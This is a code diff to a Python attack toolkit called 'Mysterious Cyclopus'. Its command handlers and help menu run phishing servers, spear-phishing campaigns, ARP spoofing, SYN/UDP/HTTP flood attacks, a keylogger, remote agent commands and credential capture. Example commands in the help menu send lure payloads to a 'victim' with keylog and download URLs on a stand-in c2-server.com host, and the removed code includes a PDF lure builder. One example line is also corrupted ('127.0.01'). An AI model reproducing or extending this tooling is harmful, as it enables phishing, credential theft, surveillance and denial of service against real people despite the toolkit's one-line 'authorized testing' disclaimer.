+                return {'success': True, 'output': 'No hosted domains'}
+            output = "Hosted Domains:\n"
+            for d in domains:
+                status = "🟢 Active" if d['active'] else "🔴 Inactive"
+                output += f"  • {d['domain']} -> {d['ip']} ({status})\n"
+            return {'success': True, 'output': output}
+        except Exception as e:
+            return {'success': False, 'output': f"Error: {e}"}
+    
+    def _domain_info(self, args: List[str]) -> Dict:
+        if not self.domain_hosting:
+            return {'success': False, 'output': 'Domain hosting engine not initialized'}
+        if not args:
+            return {'success': False, 'output': 'Usage: domain_info <domain>'}
+        domain = args[0]
+        try:
+            domains = self.domain_hosting.list_hosted_domains()
+            for d in domains:
+                if d['domain'] == domain:
+                    return {'success': True, 'output': json.dumps(d, indent=2)}
+            return {'success': False, 'output': f"Domain {domain} not found"}
+        except Exception as e:
+            return {'success': False, 'output': f"Error: {e}"}
     
     # ==================== Social Engineering ====================
     def _phish(self, platform: str) -> Dict:
@@ -5726,7 +7185,8 @@ class CommandHandler:
         link_id = args[0]
         port = int(args[1]) if len(args) > 1 else 8080
         if self.social.start_server(link_id, port):
-            return {'success': True, 'output': f"🎣 Phishing server started on port {port}"}
+            url = self.social.phishing_server.get_url()
+            return {'success': True, 'output': f"🎣 Phishing server started on {url}"}
         return {'success': False, 'output': f"Failed to start server for link {link_id}"}
     
     def _phish_stop(self, args: List[str]) -> Dict:
@@ -5810,7 +7270,7 @@ class CommandHandler:
             return {'success': False, 'output': 'ARP spoofing engine not initialized'}
         spoof_id = args[0] if args else None
         if self.arp_spoofing.stop_spoof(spoof_id):
-            return {'success': True, 'output': 'ARP spoofing stopped'}
+            return {'success': True, 'output': 'ARP spoofing stopped' + (f' ({spoof_id})' if spoof_id else '')}
         return {'success': False, 'output': 'Failed to stop ARP spoofing'}
     
     def _arp_status(self, args: List[str]) -> Dict:
@@ -5849,6 +7309,8 @@ class CommandHandler:
         output += f"  Vendor: {info.get('vendor', 'Unknown')}\n"
         output += f"  IP Address: {info.get('ip_address', 'Unknown')}\n"
         output += f"  Hostname: {info.get('hostname', 'Unknown')}\n"
+        output += f"  First Seen: {info.get('first_seen', 'Unknown')}\n"
+        output += f"  Last Seen: {info.get('last_seen', 'Unknown')}"
         return {'success': True, 'output': output}
     
     def _mac_scan(self, args: List[str]) -> Dict:
@@ -5898,21 +7360,6 @@ class CommandHandler:
         info = self.nat_info.get_nat_info()
         return {'success': True, 'output': f"Private IP: {info.private_ip}"}
     
-    # ==================== Transformer Commands ====================
-    def _transform(self, args: List[str]) -> Dict:
-        if not self.transformer:
-            return {'success': False, 'output': 'Transformer not initialized'}
-        if not args:
-            return {'success': False, 'output': 'Usage: transform <input_text>'}
-        text = ' '.join(args)
-        result = self.transformer.process_input(text)
-        output = f"🔮 Transformer Analysis:\n"
-        output += f"  Intent: {result['command']}\n"
-        output += f"  Confidence: {result['confidence']:.2f}\n"
-        output += f"  Tokens: {result['tokens']}\n"
-        output += f"  Parameters: {json.dumps(result['params'], indent=2)}"
-        return {'success': True, 'output': output}
-    
     # ==================== Docker Commands ====================
     def _docker_scan(self, args: List[str]) -> Dict:
         if not self.docker_scanner:
@@ -5931,21 +7378,19 @@ class CommandHandler:
         return {'success': False, 'output': result.get('error', 'Scan failed')}
     
     def _docker_info(self, args: List[str]) -> Dict:
-        if not self.docker_scanner:
-            return {'success': False, 'output': 'Docker scanner not initialized'}
         result = self.docker_scanner.docker_info()
         return {'success': result['success'], 'output': result['output']}
     
     def _docker_ps(self, args: List[str]) -> Dict:
-        if not self.docker_scanner:
-            return {'success': False, 'output': 'Docker scanner not initialized'}
         result = self.docker_scanner.docker_ps()
         return {'success': result['success'], 'output': result['output']}
     
     def _docker_images(self, args: List[str]) -> Dict:
-        if not self.docker_scanner:
-            return {'success': False, 'output': 'Docker scanner not initialized'}
         result = self.docker_scanner.docker_images()
+        return {'success': result['success'], 'output': result['output']}
+    
+    def _docker_bench(self, args: List[str]) -> Dict:
+        result = self.docker_scanner.docker_bench()
         return {'success': result['success'], 'output': result['output']}
     
     # ==================== Email Commands ====================
@@ -5962,7 +7407,7 @@ class CommandHandler:
         email_msg = self.email_composer.compose_email(to, subject, body, html=html)
         return {
             'success': True,
-            'output': f"📧 Email composed\nTo: {to}\nSubject: {subject}\nUse 'email_send <id>' to send"
+            'output': f"📧 Email composed\nTo: {to}\nSubject: {subject}\nUse 'email_list' to see draft, then 'email_send <id>' to send"
         }
     
     def _email_send(self, args: List[str]) -> Dict:
@@ -5987,6 +7432,16 @@ class CommandHandler:
         for e in emails:
             output += f"  • ID: {e['id']} - To: {e['to_address']} - Subject: {e['subject'][:30]} - Status: {e['status']}\n"
         return {'success': True, 'output': output}
+    
+    def _email_delete(self, args: List[str]) -> Dict:
+        if not self.email_composer:
+            return {'success': False, 'output': 'Email composer not initialized'}
+        if not args:
+            return {'success': False, 'output': 'Usage: email_delete <email_id>'}
+        email_id = int(args[0])
+        if self.email_composer.delete_email(email_id):
+            return {'success': True, 'output': f"Email {email_id} deleted"}
+        return {'success': False, 'output': f"Failed to delete email {email_id}"}
     
     # ==================== PDF Report Commands ====================
     def _report_generate(self, args: List[str]) -> Dict:
@@ -6020,41 +7475,6 @@ class CommandHandler:
             output += f"  • {r['title']} - {r['target']} - {r['created_at'][:19]}\n"
         return {'success': True, 'output': output}
     
-    # ==================== Network Monitor ====================
-    def _netmon_start(self, args: List[str]) -> Dict:
-        if not self.network_monitor:
-            return {'success': False, 'output': 'Network monitor not initialized'}
-        self.network_monitor.start()
-        return {'success': True, 'output': 'Network monitor started'}
-    
-    def _netmon_stop(self, args: List[str]) -> Dict:
-        if not self.network_monitor:
-            return {'success': False, 'output': 'Network monitor not initialized'}
-        self.network_monitor.stop()
-        return {'success': True, 'output': 'Network monitor stopped'}
-    
-    def _netmon_status(self, args: List[str]) -> Dict:
-        if not self.network_monitor:
-            return {'success': False, 'output': 'Network monitor not initialized'}
-        stats = self.network_monitor.get_statistics()
-        output = f"Network Monitor Status:\n"
-        output += f"  Running: {self.network_monitor.running}\n"
-        output += f"  Interface: {self.network_monitor.interface}\n"
-        output += f"  Packets captured: {self.network_monitor.packet_count}\n"
-        return {'success': True, 'output': output}
-    
-    def _netmon_packets(self, args: List[str]) -> Dict:
-        if not self.network_monitor:
-            return {'success': False, 'output': 'Network monitor not initialized'}
-        limit = int(args[0]) if args else 20
-        packets = self.network_monitor.get_packets(limit)
-        if not packets:
-            return {'success': True, 'output': 'No packets captured'}
-        output = f"Recent Packets ({len(packets)}):\n"
-        for p in packets:
-            output += f"  {p.get('timestamp', '')[:19]} {p.get('source_ip', '')} -> {p.get('dest_ip', '')} ({p.get('protocol', 'unknown')})\n"
-        return {'success': True, 'output': output}
-    
     # ==================== Scan Commands ====================
     def _scan(self, args: List[str]) -> Dict:
         if not args:
@@ -6084,10 +7504,12 @@ class CommandHandler:
         ip = args[0]
         notes = ' '.join(args[1:]) if len(args) > 1 else ''
         
+        domain = self.tools.ip_to_domain(ip)
+        
         try:
             ipaddress.ip_address(ip)
-            if self.db.add_managed_ip(ip, None, 'cli', notes):
-                return {'success': True, 'output': f'✅ IP {ip} added to monitoring'}
+            if self.db.add_managed_ip(ip, domain, 'cli', notes):
+                return {'success': True, 'output': f'✅ IP {ip} added to monitoring (Domain: {domain or "Unknown"})'}
             return {'success': False, 'output': f'Failed to add IP {ip}'}
         except ValueError:
             return {'success': False, 'output': f'Invalid IP: {ip}'}
@@ -6096,33 +7518,44 @@ class CommandHandler:
         if not args:
             return {'success': False, 'output': 'Usage: remove_ip <ip>'}
         ip = args[0]
-        self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (ip,))
-        self.db.conn.commit()
-        return {'success': True, 'output': f'✅ IP {ip} removed'}
+        ips = self.db.get_managed_ips()
+        if any(i['ip_address'] == ip for i in ips):
+            self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (ip,))
+            self.db.conn.commit()
+            return {'success': True, 'output': f'✅ IP {ip} removed'}
+        return {'success': False, 'output': f'IP {ip} not found'}
     
     def _block_ip(self, args: List[str]) -> Dict:
         if not args:
             return {'success': False, 'output': 'Usage: block_ip <ip> [reason]'}
         ip = args[0]
         reason = ' '.join(args[1:]) if len(args) > 1 else 'Manually blocked'
-        self.tools.block_ip(ip)
-        return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
+        firewall_success = self.tools.block_ip(ip)
+        db_success = self.db.block_ip(ip, reason, 'cli')
+        if firewall_success or db_success:
+            return {'success': True, 'output': f'🔒 IP {ip} blocked: {reason}'}
+        return {'success': False, 'output': f'Failed to block IP {ip}'}
     
     def _unblock_ip(self, args: List[str]) -> Dict:
         if not args:
             return {'success': False, 'output': 'Usage: unblock_ip <ip>'}
         ip = args[0]
-        self.tools.unblock_ip(ip)
-        return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
+        firewall_success = self.tools.unblock_ip(ip)
+        db_success = self.db.unblock_ip(ip)
+        if firewall_success or db_success:
+            return {'success': True, 'output': f'🔓 IP {ip} unblocked'}
+        return {'success': False, 'output': f'Failed to unblock IP {ip}'}
     
     def _list_ips(self, args: List[str]) -> Dict:
-        ips = self.db.get_managed_ips(True)
+        include_blocked = not (args and args[0].lower() == 'active')
+        ips = self.db.get_managed_ips(include_blocked)
         if not ips:
             return {'success': True, 'output': 'No managed IPs'}
         output = "📋 Managed IPs:\n"
         for ip in ips:
             status = "🔒" if ip['is_blocked'] else "🟢"
-            output += f"  {status} {ip['ip_address']} - {ip.get('notes', '')}\n"
+            domain = ip.get('domain', 'Unknown')
+            output += f"  {status} {ip['ip_address']} ({domain}) - {ip.get('notes', '')}\n"
         return {'success': True, 'output': output}
     
     def _ip_info(self, args: List[str]) -> Dict:
@@ -6131,9 +7564,19 @@ class CommandHandler:
         ip = args[0]
         try:
             ipaddress.ip_address(ip)
+            db_info = self.db.conn.execute(
+                "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
+            ).fetchone()
             location = self.tools.location(ip)
+            domain = self.tools.ip_to_domain(ip)
             
             output = f"🔍 IP Information: {ip}\n{'='*40}\n"
+            if domain:
+                output += f"🌐 Domain: {domain}\n"
+            if db_info:
+                output += f"📊 Status: {'🔒 Blocked' if db_info['is_blocked'] else '🟢 Active'}\n"
+                output += f"📅 Added: {db_info['added_date'][:10]}\n"
+                output += f"📝 Notes: {db_info['notes'] or 'None'}\n"
             if location.get('success'):
                 output += f"📍 Location: {location.get('country')}, {location.get('city')}\n"
                 output += f"📡 ISP: {location.get('isp')}\n"
@@ -6148,9 +7591,14 @@ class CommandHandler:
         
         ping_result = self.tools.ping(ip, 4)
         location = self.tools.location(ip)
+        nmap_result = self.tools.nmap(ip, 'quick')
+        domain = self.tools.ip_to_domain(ip)
         
-        output = f"🐙 CYCLOPUS IP Analysis Report for {ip}\n"
+        output = f"🐙 Mysterious Cyclopus IP Analysis Report for {ip}\n"
         output += "=" * 50 + "\n\n"
+        
+        if domain:
+            output += f"🌐 Domain: {domain}\n\n"
         
         output += "📡 Ping Results:\n"
         output += ping_result.output[:500] + "\n\n"
@@ -6159,7 +7607,30 @@ class CommandHandler:
             output += "📍 Geolocation:\n"
             output += f"  Country: {location.get('country')}\n"
             output += f"  City: {location.get('city')}\n"
-            output += f"  ISP: {location.get('isp')}\n"
+            output += f"  ISP: {location.get('isp')}\n\n"
+        
+        output += "🔍 Port Scan Results:\n"
+        output += nmap_result.output[:1000] + "\n\n"
+        
+        db_info = self.db.conn.execute(
+            "SELECT * FROM managed_ips WHERE ip_address = ?", (ip,)
+        ).fetchone()
+        
+        output += "🛡️ Security Status:\n"
+        if db_info and db_info['is_blocked']:
+            output += "  Status: 🔒 Blocked\n"
+            output += f"  Reason: {db_info['block_reason']}\n"
+        else:
+            output += "  Status: 🟢 Not Blocked\n"
+        
+        output += "\n💡 Recommendations:\n"
+        if ping_result.success and ping_result.output:
+            output += "  • Target is reachable\n"
+        else:
+            output += "  • Target may be down or blocking ICMP\n"
+        
+        if 'open' in nmap_result.output:
+            output += "  • Open ports detected - review security\n"
         
         return {'success': True, 'output': output}
     
@@ -6167,22 +7638,25 @@ class CommandHandler:
     def _status(self, args: List[str]) -> Dict:
         stats = self.db.get_statistics()
         output = f"""
-🐙 MYSTERIOUS CYCLOPUS System Status
+🐙 Mysterious Cyclopus System Status
 {'='*40}
 📊 Statistics:
   Total Commands: {stats.get('total_commands', 0)}
   Total Threats: {stats.get('total_threats', 0)}
   Managed IPs: {stats.get('total_managed_ips', 0)}
   Blocked IPs: {stats.get('blocked_ips', 0)}
+  Domain Hosts: {stats.get('total_domain_hosts', 0)}
   SSH Connections: {stats.get('total_ssh_connections', 0)}
   Phishing Links: {stats.get('total_phishing_links', 0)}
   Captured Credentials: {stats.get('captured_credentials', 0)}
   Keylog Entries: {stats.get('total_keylogs', 0)}
   DOS Attacks: {stats.get('total_dos_attacks', 0)}
+  Registered Agents: {stats.get('total_agents', 0)}
   Deployments: {stats.get('total_deployments', 0)}
   Cracking Jobs: {stats.get('total_cracking_jobs', 0)}
   ARP Spoofs: {stats.get('total_arp_spoofs', 0)}
   MAC Entries: {stats.get('total_mac_entries', 0)}
+  NAT Entries: {stats.get('total_nat_entries', 0)}
   Emails: {stats.get('total_emails', 0)}
   PDF Reports: {stats.get('total_pdf_reports', 0)}
 
@@ -6227,11 +7701,25 @@ Boot Time: {datetime.datetime.fromtimestamp(psutil.boot_time()).strftime('%Y-%m-
 """
         return {'success': True, 'output': output}
     
+    def _threats(self, args: List[str]) -> Dict:
+        limit = 10
+        if args and args[0].isdigit():
+            limit = int(args[0])
+        threats = self.db.get_recent_threats(limit)
+        if not threats:
+            return {'success': True, 'output': 'No threats detected'}
+        output = "🚨 Recent Threats:\n"
+        for t in threats:
+            severity_color = "🔴" if t['severity'] in ['critical', 'high'] else "🟡" if t['severity'] == 'medium' else "🟢"
+            output += f"  {severity_color} {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
+        return {'success': True, 'output': output}
+    
     def _report(self, args: List[str]) -> Dict:
         stats = self.db.get_statistics()
+        threats = self.db.get_recent_threats(10)
         
         report = f"""
-🐙 MYSTERIOUS CYCLOPUS Security Report
+🐙 Mysterious Cyclopus Security Report
 {'='*50}
 Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 
@@ -6240,12 +7728,18 @@ Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
   Total Threats: {stats.get('total_threats', 0)}
   Managed IPs: {stats.get('total_managed_ips', 0)}
   Blocked IPs: {stats.get('blocked_ips', 0)}
+  Domain Hosts: {stats.get('total_domain_hosts', 0)}
   SSH Connections: {stats.get('total_ssh_connections', 0)}
   Phishing Links: {stats.get('total_phishing_links', 0)}
   Captured Credentials: {stats.get('captured_credentials', 0)}
   Keylog Entries: {stats.get('total_keylogs', 0)}
   Cracking Jobs: {stats.get('total_cracking_jobs', 0)}
+
+🚨 Recent Threats:
 """
+        for t in threats[:5]:
+            report += f"  • {t['timestamp'][:19]} - {t['threat_type']} from {t['source_ip']} ({t['severity']})\n"
+        
         filename = f"report_{int(time.time())}.txt"
         filepath = os.path.join(REPORT_DIR, filename)
         with open(filepath, 'w') as f:
@@ -6268,14 +7762,15 @@ Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
     
     def _help(self, args: List[str]) -> Dict:
         help_text = f"""
-{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
-║{Colors.ACCENT}     🐙 MYSTERIOUS CYCLOPUS BOT v1.0.0 - HELP MENU                   {Colors.PRIMARY}║
+{Colors.ORANGE}╔══════════════════════════════════════════════════════════════════════════════╗
+║{Colors.WHITE}        🐙 MYSTERIOUS CYCLOPUS v1.0.0 - HELP MENU                    {Colors.ORANGE}║
 ╠══════════════════════════════════════════════════════════════════════════════╣
-║{Colors.SECONDARY}                                                                           {Colors.PRIMARY}║
+║{Colors.WHITE}                                                                           {Colors.ORANGE}║
 ║{Colors.SUCCESS}📡 PING COMMANDS:{Colors.RESET}
 ║  ping <target> [count]         - Ping a target
 ║  ping6 <target>                - IPv6 ping
 ║  ping_sweep <network>          - Ping sweep entire network
+║  fping <targets...>            - Fast ping multiple targets
 ║
 ║{Colors.SUCCESS}🔍 NMAP COMMANDS:{Colors.RESET}
 ║  nmap <target> [options]       - Run nmap scan
@@ -6297,22 +7792,16 @@ Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 ║  curl_get <url>                - GET request
 ║  curl_post <url> <data>        - POST request
 ║  curl_head <url>               - HEAD request
+║  curl_options <url>            - OPTIONS request
 ║
 ║{Colors.SUCCESS}🔌 NETCAT COMMANDS:{Colors.RESET}
 ║  netcat <host> <port> [cmd]    - Connect to host/port
 ║  nc_listen <port>              - Listen on port
 ║  nc_scan <host> <ports>        - Port scan with netcat
 ║
-║{Colors.SUCCESS}🔒 SSH COMMANDS:{Colors.RESET}
-║  ssh_add <name> <host> <user> [pass] - Add SSH connection
-║  ssh_list                      - List SSH connections
-║  ssh_connect <conn_id>         - Connect to server
-║  ssh_exec <conn_id> <command>  - Execute command
-║  ssh_disconnect <conn_id>      - Disconnect
-║
 ║{Colors.SUCCESS}🗺️ TRACEROUTE COMMANDS:{Colors.RESET}
 ║  traceroute <target>           - Trace network path
-║  tracert <target>              - Trace network path (Windows)
+║  tracert <target>              - Same as traceroute
 ║
 ║{Colors.SUCCESS}📋 WHOIS COMMANDS:{Colors.RESET}
 ║  whois <domain>                - WHOIS lookup
@@ -6326,11 +7815,23 @@ Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 ║{Colors.SUCCESS}📍 LOCATION COMMANDS:{Colors.RESET}
 ║  location <ip>                 - IP geolocation
 ║
+║{Colors.SUCCESS}🔒 SSH COMMANDS:{Colors.RESET}
+║  ssh_add <name> <host> <user> [pass] - Add SSH connection
+║  ssh_list                      - List SSH connections
+║  ssh_connect <conn_id>         - Connect to server
+║  ssh_exec <conn_id> <command>  - Execute command
+║  ssh_disconnect <conn_id>      - Disconnect
+║
 ║{Colors.SUCCESS}🚀 TRAFFIC GENERATION:{Colors.RESET}
 ║  traffic <type> <ip> <duration> [port] [rate] - Generate traffic
 ║  traffic_types                 - List available types
 ║  traffic_status                - Show active generators
 ║  traffic_stop [id]             - Stop generation
+║
+║{Colors.SUCCESS}🕷️ NIKTO COMMANDS:{Colors.RESET}
+║  nikto <target>                - Web vulnerability scan
+║  nikto_full <target>           - Full scan with all tests
+║  nikto_ssl <target>            - SSL/TLS scan
 ║
 ║{Colors.SUCCESS}💥 DOS ATTACKS:{Colors.RESET}
 ║  dos_syn <ip> <port> <duration> [threads] - SYN flood attack
@@ -6340,7 +7841,24 @@ Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 ║  dos_stop [id]                - Stop DOS attack
 ║  dos_status                    - Show active attacks
 ║
-║{Colors.SUCCESS}⌨️ KEYLOGGER:{Colors.RESET}
+║{Colors.SUCCESS}🎣 SPEAR PHISHING:{Colors.RESET}
+║  spear_create <name> <subject> <from> <template> <targets> - Create campaign
+║  spear_send <campaign_id>      - Send campaign
+║  spear_list                    - List all campaigns
+║
+║{Colors.SUCCESS}🤖 AGENT COMMANDS:{Colors.RESET}
+║  agent_register <name> <ip>    - Register new agent
+║  agent_command <id> <command>  - Send command to agent
+║  agent_list                    - List all agents
+║  agent_status <id>            - Check agent status
+║
+║{Colors.SUCCESS}📡 NETWORK MONITOR:{Colors.RESET}
+║  netmon_start                  - Start network monitoring
+║  netmon_stop                   - Stop network monitoring
+║  netmon_status                 - Show monitoring status
+║  netmon_packets [limit]        - Show captured packets
+║
+║{Colors.SUCCESS}⌨️ ADVANCED KEYLOGGER:{Colors.RESET}
 ║  keylogger_start               - Start keylogger (F10 to stop)
 ║  keylogger_stop                - Stop keylogger
 ║  keylogger_status              - Check keylogger status
@@ -6354,6 +7872,15 @@ Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 ║  deploy_link <name> <target> <url> - Create direct link payload
 ║  deploy_executable <name> <target> <server> - Create executable payload
 ║  deploy_list                  - List all deployments
+║  deploy_track <id>            - Track deployment open
+║
+║{Colors.SUCCESS}🌐 DOMAIN HOSTING:{Colors.RESET}
+║  ip_to_domain <ip>            - Translate IP to domain
+║  domain_to_ip <domain>        - Translate domain to IP
+║  host_domain <ip> <domain> [port] - Host a domain
+║  host_website <domain> <html_file> - Host a website
+║  list_domains                 - List hosted domains
+║  domain_info <domain>         - Domain information
 ║
 ║{Colors.SUCCESS}🎣 SOCIAL ENGINEERING:{Colors.RESET}
 ║  phish_facebook                - Generate Facebook phishing link
@@ -6396,389 +7923,71 @@ Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
 ║  nat_public                    - Show public IP
 ║  nat_private                   - Show private IP
 ║
-║{Colors.SUCCESS}🔮 TRANSFORMER:{Colors.RESET}
-║  transform <text>              - Analyze text with transformer
-║
 ║{Colors.SUCCESS}🐳 DOCKER COMMANDS:{Colors.RESET}
 ║  docker_scan <image>           - Scan Docker image
 ║  docker_info                   - Docker info
 ║  docker_ps                     - Running containers
 ║  docker_images                 - List images
+║  docker_bench                  - Docker Bench Security
 ║
 ║{Colors.SUCCESS}📧 EMAIL COMMANDS:{Colors.RESET}
 ║  email_compose <to> <subject> <body> - Compose email
 ║  email_send <email_id>         - Send email
 ║  email_list [status]           - List emails
+║  email_delete <email_id>       - Delete email
 ║
 ║{Colors.SUCCESS}📊 PDF REPORT COMMANDS:{Colors.RESET}
 ║  report_generate <title> <target> - Generate PDF report
 ║  report_list                   - List PDF reports
-║
-║{Colors.SUCCESS}📡 NETWORK MONITOR:{Colors.RESET}
-║  netmon_start                  - Start network monitoring
-║  netmon_stop                   - Stop network monitoring
-║  netmon_status                 - Show monitoring status
-║  netmon_packets [limit]        - Show captured packets
-║
-║{Colors.SUCCESS}🛡️ NETWORK COMMANDS:{Colors.RESET}
-║  scan <target>                 - Quick port scan
-║  quick_scan <target>           - Quick port scan
-║  full_scan <target>            - Full port scan
 ║
 ║{Colors.SUCCESS}🔒 IP MANAGEMENT:{Colors.RESET}
 ║  add_ip <ip> [notes]           - Add IP to monitoring
 ║  remove_ip <ip>                - Remove IP from monitoring
 ║  block_ip <ip> [reason]        - Block IP via firewall
 ║  unblock_ip <ip>               - Unblock IP
-║  list_ips                      - List managed IPs
+║  list_ips [active]             - List managed IPs
 ║  ip_info <ip>                  - Detailed IP information
 ║  analyze_ip <ip>               - Complete IP analysis
-║
-║{Colors.SUCCESS}🎬 ANIMATION COMMANDS:{Colors.RESET}
-║  anim_spinner [duration] [msg] - Show spinner animation
-║  anim_matrix [duration]        - Show matrix rain animation
-║  anim_pulse [duration] [text]  - Show pulse animation
-║  anim_wave [duration] [text]   - Show wave animation
-║  anim_glitch [duration] [text] - Show glitch animation
-║  anim_octopus [duration]       - Show octopus animation
 ║
 ║{Colors.SUCCESS}📊 SYSTEM COMMANDS:{Colors.RESET}
 ║  status                        - System status
 ║  history [limit]               - Command history
 ║  system                        - System information
+║  threats [limit]               - Recent threats
 ║  report                        - Security report
 ║  clear                         - Clear screen
 ║  help                          - This help menu
 ║
 ║{Colors.SUCCESS}💡 EXAMPLES:{Colors.RESET}
-║  ping 127.0.0.1
+║  ping 127.0.01
 ║  nmap_quick 192.168.1.1
 ║  wget https://example.com/file.txt
 ║  curl https://example.com
-║  traceroute iankulani.com
-║  whois example.com
-║  dig example.com
+║  traceroute 127.0.0.1
 ║  traffic icmp 192.168.1.1 10
+║  nikto example.com
 ║  dos_syn 192.168.1.100 80 30 100
 ║  crack md5 5f4dcc3b5aa765d61d8327deb882cf99
 ║  arp_spoof 192.168.1.100 192.168.1.1
 ║  mac_info 00:11:22:33:44:55
 ║  nat_info
-║  transform "ping 127.0.0.1"
 ║  keylogger_start
-║  anim_matrix 3
-║  anim_pulse 2 "CYCLOPUS"
 ║  docker_scan alpine:latest
 ║  email_compose "user@example.com" "Hello" "This is a test email"
 ║  report_generate "Security Report" "192.168.1.1"
 ║  deploy_pdf "Invoice" "victim@email.com" "http://c2-server.com/keylog"
+║  deploy_link "Update" "user@email.com" "http://c2-server.com/download"
+║  ip_to_domain 192.168.1.1
+║  domain_to_ip google.com
+║  host_domain 192.168.1.100 mydomain.local 8080
 ║  phish_facebook
 ║  add_ip 192.168.1.100 Suspicious
 ║  analyze_ip 192.168.1.1
 ║
-║{Colors.ACCENT}⚠️  For authorized security testing only{Colors.RESET}
+║{Colors.ORANGE}⚠️  For authorized security testing only{Colors.RESET}
 ╚══════════════════════════════════════════════════════════════════════════════╝
 """
         return {'success': True, 'output': help_text}
-
-# =====================
-# NETWORK MONITOR
-# =====================
-class NetworkMonitor:
-    def __init__(self, db: DatabaseManager, config: ConfigManager):
-        self.db = db
-        self.config = config
-        self.running = False
-        self.packet_count = 0
-        self.interface = config.get('network_monitor.interface', 'eth0')
-        self.promiscuous = config.get('network_monitor.promiscuous', False)
-    
-    def start(self):
-        self.running = True
-        threading.Thread(target=self._monitor_loop, daemon=True).start()
-        print(f"{Colors.SUCCESS}✅ Network monitor started on {self.interface}{Colors.RESET}")
-    
-    def stop(self):
-        self.running = False
-    
-    def _monitor_loop(self):
-        while self.running:
-            try:
-                if SCAPY_AVAILABLE:
-                    self._scapy_monitor()
-                else:
-                    time.sleep(5)
-            except Exception as e:
-                logger.error(f"Network monitor error: {e}")
-                time.sleep(5)
-    
-    def _scapy_monitor(self):
-        from scapy.all import sniff
-        sniff(iface=self.interface, prn=self._process_packet, store=0,
-              promisc=self.promiscuous, count=100)
-    
-    def _process_packet(self, packet):
-        self.packet_count += 1
-        
-        try:
-            if SCAPY_AVAILABLE and hasattr(packet, 'haslayer'):
-                if packet.haslayer(IP):
-                    ip = packet[IP]
-                    src_ip = ip.src
-                    dst_ip = ip.dst
-                    protocol = ip.proto
-                    size = len(packet)
-                    
-                    src_port = 0
-                    dst_port = 0
-                    
-                    if packet.haslayer(TCP):
-                        src_port = packet[TCP].sport
-                        dst_port = packet[TCP].dport
-                        protocol = "TCP"
-                    elif packet.haslayer(UDP):
-                        src_port = packet[UDP].sport
-                        dst_port = packet[UDP].dport
-                        protocol = "UDP"
-                    elif packet.haslayer(ICMP):
-                        protocol = "ICMP"
-                    
-                    self.db.save_network_packet(src_ip, dst_ip, src_port, dst_port, protocol, size)
-        except Exception as e:
-            logger.error(f"Packet processing error: {e}")
-    
-    def get_packets(self, limit: int = 100) -> List[Dict]:
-        return self.db.get_network_packets(limit)
-    
-    def get_statistics(self) -> Dict:
-        packets = self.db.get_network_packets(1000)
-        stats = {
-            'total_packets': len(packets),
-            'protocols': Counter(),
-            'top_sources': Counter()
-        }
-        
-        for p in packets:
-            stats['protocols'][p.get('protocol', 'unknown')] += 1
-            stats['top_sources'][p.get('source_ip', 'unknown')] += 1
-        
-        return stats
-
-# =====================
-# DOS ENGINE (Simplified)
-# =====================
-class DOSEngine:
-    def __init__(self, db: DatabaseManager, config: ConfigManager):
-        self.db = db
-        self.config = config
-        self.running_attacks: Dict[str, threading.Event] = {}
-    
-    def syn_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
-        return self._attack("syn", target_ip, port, duration, threads)
-    
-    def udp_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
-        return self._attack("udp", target_ip, port, duration, threads)
-    
-    def http_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
-        return self._attack("http", target_ip, port, duration, threads)
-    
-    def icmp_flood(self, target_ip: str, duration: int, threads: int = 50) -> Dict:
-        return self._attack("icmp", target_ip, 0, duration, threads)
-    
-    def _attack(self, attack_type: str, target_ip: str, port: int, duration: int, threads: int) -> Dict:
-        max_threads = self.config.get('dos.max_threads', 100)
-        if threads > max_threads:
-            return {'success': False, 'output': f'Threads exceed maximum ({max_threads})'}
-        
-        attack_id = f"{attack_type}_{target_ip}_{int(time.time())}"
-        stop_event = threading.Event()
-        self.running_attacks[attack_id] = stop_event
-        
-        return {
-            'success': True,
-            'output': f"💥 {attack_type.upper()} flood started on {target_ip}:{port} for {duration}s"
-        }
-    
-    def stop(self, attack_id: str = None) -> bool:
-        if attack_id:
-            if attack_id in self.running_attacks:
-                self.running_attacks[attack_id].set()
-                return True
-        else:
-            for event in self.running_attacks.values():
-                event.set()
-            return True
-        return False
-    
-    def get_active(self) -> List[Dict]:
-        return [{'id': aid, 'type': aid.split('_')[0]} for aid in self.running_attacks.keys()]
-
-# =====================
-# DEPLOYMENT ENGINE
-# =====================
-class DeploymentEngine:
-    def __init__(self, db: DatabaseManager, config: ConfigManager):
-        self.db = db
-        self.config = config
-    
-    def create_pdf_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
-        deployment_id = str(uuid.uuid4())[:8]
-        
-        pdf_content = f"""
-        %PDF-1.4
-        1 0 obj
-        << /Type /Catalog /Pages 2 0 R >>
-        endobj
-        2 0 obj
-        << /Type /Pages /Kids [3 0 R] /Count 1 >>
-        endobj
-        3 0 obj
-        << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
-        endobj
-        4 0 obj
-        << /Length 200 >>
-        stream
-        BT
-        /F1 24 Tf
-        100 700 Td
-        (Important Document) Tj
-        /F1 12 Tf
-        100 650 Td
-        (Please click here to view: {keylog_url}) Tj
-        ET
-        endstream
-        endobj
-        xref
-        0 5
-        0000000000 65535 f
-        0000000009 00000 n
-        0000000054 00000 n
-        0000000102 00000 n
-        0000000200 00000 n
-        trailer
-        << /Size 5 /Root 1 0 R >>
-        startxref
-        300
-        %%EOF
-        """
-        
